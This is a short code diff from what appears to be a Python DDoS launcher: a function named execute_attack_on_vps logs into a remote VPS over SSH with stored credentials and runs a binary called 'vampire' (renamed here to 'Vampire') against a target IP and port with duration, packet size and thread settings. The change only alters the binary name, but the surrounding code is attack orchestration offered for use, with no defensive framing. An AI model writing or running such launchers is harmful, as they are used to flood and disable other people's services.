@@ -18,7 +18,7 @@ def execute_attack_on_vps(ip, port, duration, byte_size, threads):
         ssh.connect(VPS['ip'], username=VPS['username'], password=VPS['password'])
 
         # Prepare the command to execute on remote VPS (dynamically pass parameters)
-        command = f"./vampire {ip} {port} {duration} {byte_size} {threads}"
+        command = f"./Vampire {ip} {port} {duration} {byte_size} {threads}"
 
         # Execute the command
         stdin, stdout, stderr = ssh.exec_command(command)
